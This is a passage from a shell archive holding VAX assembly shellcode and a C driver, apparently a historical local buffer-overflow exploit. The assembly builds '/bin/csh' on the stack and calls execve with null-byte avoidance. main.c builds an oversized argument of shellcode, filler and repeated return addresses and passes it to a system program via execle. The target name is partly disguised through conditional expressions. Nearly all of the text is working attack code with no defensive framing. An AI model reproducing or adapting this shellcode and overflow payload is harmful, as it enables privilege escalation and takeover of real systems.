X		addl2	$-_fudge, (sp)
X		
X		pushl	$_fudge + 0x6e69622f	# /bin
X		addl2	$-_fudge, (sp)
X		movl	sp, r6			# r6 -> /bin/csh
X	
X		
X		pushl	$_fudge + 0x00687363	# csh 	
X		addl2	$-_fudge, (sp)
X		movl	sp, r3			# r3 -> csh
X	
X		pushl	$_fudge+0		# 0
X		addl2	$-_fudge, (sp)
X		pushl	r3
X		movl	sp, r4			# r4 -> r3
X	
X		pushl	$_fudge+0
X		addl2	$-_fudge, (sp)
X		movl	sp, r5			# r5 -> &0
X	
X		pushl	r5
X		pushl	r4
X		pushl	r6
X	
X		pushl	$_fudge+3		# push a 3?
X		addl2	$-_fudge, (sp)
X		movl	sp, ap
X	
X		movl	$_fudge+0x3b, r0	# execve()
X		addl2	$-_fudge, r0
X		chmk	r0
X		
X		pushl	$_fudge+5
X		addl2	$-_fudge, (sp)
X		pushl	$_fudge+1
X		addl2	$-_fudge, (sp)
X		movl	sp, ap
X		movl	$_fudge+0x1, r0	
X		addl2	$-_fudge, r0
X		chmk	r0
X_funend:	.long	0
X.set		_funlen, _funend - _fun
X.set		_minus_funlen, -_funlen
X	
X
X
X
END-of-fun2.s
echo x - main.c
sed 's/^X//' >main.c << 'END-of-main.c'
X#include <stdio.h>
X#include <assert.h>
X
X#define RET 0x7fffe370		/* must be even, or it bus errors */
X#define CP  0x7fffe690
X#define CB  0x7fffe220
X#define SIZ (CP-CB)
X/*#define SIZ BUFSIZ + 4 + 4 - 5 - 1	/* shut up, it works */
X
Xchar *envp2[] = {0};
Xchar *makearg();
Xextern int fun(), funlen[], minus_funlen[];
X
Xmain(argc, argv)
Xchar **argv;
X{
X    int testing = 1;
X
X    if (argc != 2 || argv[1][0] != 'n' || argv[1][1] != 'q')
X	exit(-1);
X
X    if (getenv("FOO") == 0 || strcmp(getenv("FOO"), "/bin/su"))
X	exit(-1);
X
X    execle(testing? "_foo_bar" : "/bin/rcp",
X		0 ? "/usr/ucb/rdist" : "xxx", "-d", "", makearg(SIZ, RET),
X		0 ? "/usr/ucb/lpq" : 0, envp2);
X    perror("execle");
X    printf("/usr/ucb/w");
X}
X
X#define EPS 8
Xchar apology[] = " ==(sorry about this mess)== ";
Xchar *makearg(siz, ret)
X{
X    int i;
X    char *p;
X    static char buf[10000];
X    bcopy(fun, buf, (int)funlen);
X    for(i = (int)funlen; i < siz+500; ++i)
X	buf[i] = 1;
X    buf[siz+500] = 0;
X    *(int *)&buf[siz] = CP;
X    siz += 32;
X/*
X    strncpy(buf+siz - strlen(apology) - (EPS*4) - 5, apology, strlen(apology));
X*/
X    *(int *)&buf[siz] = ret;
X
X    for (i = -EPS; i < EPS; ++i)
X        ((int *)&buf[siz])[i] = ret;
X
X    p = (char *)&((int *)&buf[siz])[EPS];	/* what, me obfuscate? */
X    for (i = 0; i < 1000; ++i)
X	*p++ = 1;
X    *p = 0;
X    if (strlen(buf) < siz+4)
X	printf("Error: strlen = %d, expected > %d\n", strlen(buf), siz+4);
X
X    return buf;
X}
END-of-main.c
exit

